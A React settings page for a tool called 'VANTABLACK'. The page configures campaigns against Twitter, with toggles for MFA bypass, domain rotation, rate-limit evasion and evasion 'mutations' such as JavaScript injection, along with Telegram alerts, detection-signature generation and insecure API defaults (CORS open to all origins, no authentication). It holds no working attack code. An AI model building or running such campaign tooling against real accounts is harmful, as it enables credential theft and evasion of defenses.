import React, { useState } from 'react';
import { Card, Form, Input, Button, Switch, Select, InputNumber, Alert, Tabs, Divider } from 'antd';
import { 
  SettingOutlined, 
  SaveOutlined, 
  ReloadOutlined,
  TwitterOutlined,
  SecurityScanOutlined,
  ThunderboltOutlined
} from '@ant-design/icons';

const { TabPane } = Tabs;
const { Option } = Select;
const { TextArea } = Input;

const Settings: React.FC = () => {
  const [form] = Form.useForm();
  const [loading, setLoading] = useState(false);
  const [saved, setSaved] = useState(false);

  const handleSave = async () => {
    setLoading(true);
    try {
      const values = await form.validateFields();
      console.log('Saving settings:', values);
      // Simulate API call
      setTimeout(() => {
        setLoading(false);
        setSaved(true);
        setTimeout(() => setSaved(false), 3000);
      }, 1000);
    } catch (error) {
      setLoading(false);
    }
  };

  const handleReset = () => {
    form.resetFields();
  };

  return (
    <div className="settings">
      <div style={{ marginBottom: 24 }}>
        <h2><SettingOutlined /> Settings</h2>
        <p>Configure VANTABLACK system settings and preferences</p>
      </div>

      {saved && (
        <Alert
          message="Settings Saved"
          description="Your changes have been successfully saved"
          type="success"
          showIcon
          style={{ marginBottom: 24 }}
        />
      )}

      <Card>
        <Tabs defaultActiveKey="general">
          <TabPane tab="General Settings" key="general">
            <Form
              form={form}
              layout="vertical"
              initialValues={{
                systemName: 'VANTABLACK',
                version: '4.0.0',
                logLevel: 'INFO',
                maxConcurrentCampaigns: 5,
                autoCleanup: true,
                retentionDays: 30
              }}
            >
              <Form.Item
                label="System Name"
                name="systemName"
                rules={[{ required: true, message: 'Please enter system name' }]}
              >
                <Input />
              </Form.Item>

              <Form.Item
                label="Version"
                name="version"
              >
                <Input disabled />
              </Form.Item>

              <Form.Item
                label="Log Level"
                name="logLevel"
              >
                <Select>
                  <Option value="DEBUG">DEBUG</Option>
                  <Option value="INFO">INFO</Option>
                  <Option value="WARNING">WARNING</Option>
                  <Option value="ERROR">ERROR</Option>
                </Select>
              </Form.Item>

              <Form.Item
                label="Max Concurrent Campaigns"
                name="maxConcurrentCampaigns"
              >
                <InputNumber min={1} max={20} />
              </Form.Item>

              <Form.Item
                label="Auto Cleanup"
                name="autoCleanup"
                valuePropName="checked"
              >
                <Switch />
              </Form.Item>

              <Form.Item
                label="Data Retention Days"
                name="retentionDays"
              >
                <InputNumber min={1} max={365} />
              </Form.Item>
            </Form>
          </TabPane>

          <TabPane tab={<span><TwitterOutlined /> Twitter</span>} key="twitter">
            <Form
              layout="vertical"
              initialValues={{
                twitterOptimization: true,
                mfaBypass: true,
                domainRotation: true,
                rateLimitEvasion: true,
                monitoringInterval: 30,
                maxVariants: 10,
                bypassThreshold: 0.3
              }}
            >
              <Form.Item
                label="Enable Twitter Optimization"
                name="twitterOptimization"
                valuePropName="checked"
              >
                <Switch />
              </Form.Item>

              <Form.Item
                label="MFA Bypass Techniques"
                name="mfaBypass"
                valuePropName="checked"
              >
                <Switch />
              </Form.Item>

              <Form.Item
                label="Automatic Domain Rotation"
                name="domainRotation"
                valuePropName="checked"
              >
                <Switch />
              </Form.Item>

              <Form.Item
                label="Rate Limiting Evasion"
                name="rateLimitEvasion"
                valuePropName="checked"
              >
                <Switch />
              </Form.Item>

              <Form.Item
                label="Monitoring Interval (seconds)"
                name="monitoringInterval"
              >
                <InputNumber min={10} max={300} />
              </Form.Item>

              <Form.Item
                label="Maximum Variants per Campaign"
                name="maxVariants"
              >
                <InputNumber min={1} max={50} />
              </Form.Item>

              <Form.Item
                label="MFA Bypass Success Threshold"
                name="bypassThreshold"
              >
                <InputNumber min={0.1} max={1.0} step={0.1} />
              </Form.Item>
            </Form>
          </TabPane>

          <TabPane tab={<span><SecurityScanOutlined /> Analysis</span>} key="analysis">
            <Form
              layout="vertical"
              initialValues={{
                autoAnalyze: true,
                generateSignatures: true,
                mitreMapping: true,
                threatIntel: true,
                analysisDepth: 'medium',
                signatureTypes: ['yara', 'snort', 'regex'],
                confidenceThreshold: 0.7
              }}
            >
              <Form.Item
                label="Automatic Analysis"
                name="autoAnalyze"
                valuePropName="checked"
              >
                <Switch />
              </Form.Item>

              <Form.Item
                label="Generate Detection Signatures"
                name="generateSignatures"
                valuePropName="checked"
              >
                <Switch />
              </Form.Item>

              <Form.Item
                label="MITRE ATT&CK Mapping"
                name="mitreMapping"
                valuePropName="checked"
              >
                <Switch />
              </Form.Item>

              <Form.Item
                label="Threat Intelligence Export"
                name="threatIntel"
                valuePropName="checked"
              >
                <Switch />
              </Form.Item>

              <Form.Item
                label="Analysis Depth"
                name="analysisDepth"
              >
                <Select>
                  <Option value="basic">Basic</Option>
                  <Option value="medium">Medium</Option>
                  <Option value="deep">Deep</Option>
                </Select>
              </Form.Item>

              <Form.Item
                label="Signature Types"
                name="signatureTypes"
              >
                <Select mode="multiple">
                  <Option value="yara">YARA</Option>
                  <Option value="snort">Snort</Option>
                  <Option value="regex">Regex</Option>
                  <Option value="ioc">IOC</Option>
                </Select>
              </Form.Item>

              <Form.Item
                label="Confidence Threshold"
                name="confidenceThreshold"
              >
                <InputNumber min={0.1} max={1.0} step={0.1} />
              </Form.Item>
            </Form>
          </TabPane>

          <TabPane tab={<span><ThunderboltOutlined /> Mutation</span>} key="mutation">
            <Form
              layout="vertical"
              initialValues={{
                autoMutation: false,
                mutationFrequency: 'weekly',
                evasionLevel: 'medium',
                techniques: ['domain_variation', 'path_obfuscation', 'header_manipulation'],
                maxRiskLevel: 'high',
                bypassScore: 0.8
              }}
            >
              <Form.Item
                label="Automatic Mutation"
                name="autoMutation"
                valuePropName="checked"
              >
                <Switch />
              </Form.Item>

              <Form.Item
                label="Mutation Frequency"
                name="mutationFrequency"
              >
                <Select>
                  <Option value="daily">Daily</Option>
                  <Option value="weekly">Weekly</Option>
                  <Option value="monthly">Monthly</Option>
                </Select>
              </Form.Item>

              <Form.Item
                label="Evasion Level"
                name="evasionLevel"
              >
                <Select>
                  <Option value="low">Low</Option>
                  <Option value="medium">Medium</Option>
                  <Option value="high">High</Option>
                  <Option value="paranoid">Paranoid</Option>
                </Select>
              </Form.Item>

              <Form.Item
                label="Mutation Techniques"
                name="techniques"
              >
                <Select mode="multiple">
                  <Option value="domain_variation">Domain Variation</Option>
                  <Option value="path_obfuscation">Path Obfuscation</Option>
                  <Option value="parameter_randomization">Parameter Randomization</Option>
                  <Option value="header_manipulation">Header Manipulation</Option>
                  <Option value="javascript_injection">JavaScript Injection</Option>
                  <Option value="timing_variation">Timing Variation</Option>
                  <Option value="user_agent_rotation">User Agent Rotation</Option>
                  <Option value="content_encoding">Content Encoding</Option>
                </Select>
              </Form.Item>

              <Form.Item
                label="Maximum Risk Level"
                name="maxRiskLevel"
              >
                <Select>
                  <Option value="low">Low</Option>
                  <Option value="medium">Medium</Option>
                  <Option value="high">High</Option>
                  <Option value="critical">Critical</Option>
                </Select>
              </Form.Item>

              <Form.Item
                label="Target Bypass Score"
                name="bypassScore"
              >
                <InputNumber min={0.1} max={1.0} step={0.1} />
              </Form.Item>
            </Form>
          </TabPane>

          <TabPane tab="Notifications" key="notifications">
            <Form
              layout="vertical"
              initialValues={{
                telegramEnabled: true,
                telegramToken: '',
                telegramChatId: '',
                discordEnabled: false,
                discordWebhook: '',
                emailEnabled: false,
                emailSmtp: '',
                emailFrom: '',
                emailTo: '',
                alertLevels: ['critical', 'high']
              }}
            >
              <Divider>Telegram Notifications</Divider>
              
              <Form.Item
                label="Enable Telegram"
                name="telegramEnabled"
                valuePropName="checked"
              >
                <Switch />
              </Form.Item>

              <Form.Item
                label="Bot Token"
                name="telegramToken"
              >
                <Input.Password placeholder="Enter Telegram bot token" />
              </Form.Item>

              <Form.Item
                label="Chat ID"
                name="telegramChatId"
              >
                <Input placeholder="Enter Telegram chat ID" />
              </Form.Item>

              <Divider>Discord Notifications</Divider>

              <Form.Item
                label="Enable Discord"
                name="discordEnabled"
                valuePropName="checked"
              >
                <Switch />
              </Form.Item>

              <Form.Item
                label="Webhook URL"
                name="discordWebhook"
              >
                <Input placeholder="Enter Discord webhook URL" />
              </Form.Item>

              <Divider>Email Notifications</Divider>

              <Form.Item
                label="Enable Email"
                name="emailEnabled"
                valuePropName="checked"
              >
                <Switch />
              </Form.Item>

              <Form.Item
                label="SMTP Server"
                name="emailSmtp"
              >
                <Input placeholder="smtp.gmail.com:587" />
              </Form.Item>

              <Form.Item
                label="From Email"
                name="emailFrom"
              >
                <Input type="email" placeholder="noreply@vantablack.com" />
              </Form.Item>

              <Form.Item
                label="To Email"
                name="emailTo"
              >
                <Input type="email" placeholder="admin@company.com" />
              </Form.Item>

              <Form.Item
                label="Alert Levels"
                name="alertLevels"
              >
                <Select mode="multiple">
                  <Option value="critical">Critical</Option>
                  <Option value="high">High</Option>
                  <Option value="medium">Medium</Option>
                  <Option value="low">Low</Option>
                </Select>
              </Form.Item>
            </Form>
          </TabPane>

          <TabPane tab="API & Integration" key="api">
            <Form
              layout="vertical"
              initialValues={{
                apiEnabled: true,
                apiKey: '',
                corsEnabled: true,
                corsOrigins: ['*'],
                rateLimiting: true,
                maxRequestsPerMinute: 100,
                requireAuth: false,
                webhooks: []
              }}
            >
              <Form.Item
                label="Enable API"
                name="apiEnabled"
                valuePropName="checked"
              >
                <Switch />
              </Form.Item>

              <Form.Item
                label="API Key"
                name="apiKey"
              >
                <Input.Password placeholder="Enter API key for authentication" />
              </Form.Item>

              <Form.Item
                label="Enable CORS"
                name="corsEnabled"
                valuePropName="checked"
              >
                <Switch />
              </Form.Item>

              <Form.Item
                label="CORS Origins"
                name="corsOrigins"
              >
                <Select mode="tags" placeholder="Add allowed origins">
                  <Option value="*">All Origins (*)</Option>
                  <Option value="http://localhost:3000">Localhost</Option>
                </Select>
              </Form.Item>

              <Form.Item
                label="Rate Limiting"
                name="rateLimiting"
                valuePropName="checked"
              >
                <Switch />
              </Form.Item>

              <Form.Item
                label="Max Requests per Minute"
                name="maxRequestsPerMinute"
              >
                <InputNumber min={1} max={1000} />
              </Form.Item>

              <Form.Item
                label="Require Authentication"
                name="requireAuth"
                valuePropName="checked"
              >
                <Switch />
              </Form.Item>
            </Form>
          </TabPane>
        </Tabs>

        <Divider />

        <div style={{ display: 'flex', justifyContent: 'flex-end', gap: 8 }}>
          <Button icon={<ReloadOutlined />} onClick={handleReset}>
            Reset
          </Button>
          <Button 
            type="primary" 
            icon={<SaveOutlined />} 
            onClick={handleSave}
            loading={loading}
          >
            Save Settings
          </Button>
        </div>
      </Card>
    </div>
  );
};

export default Settings;
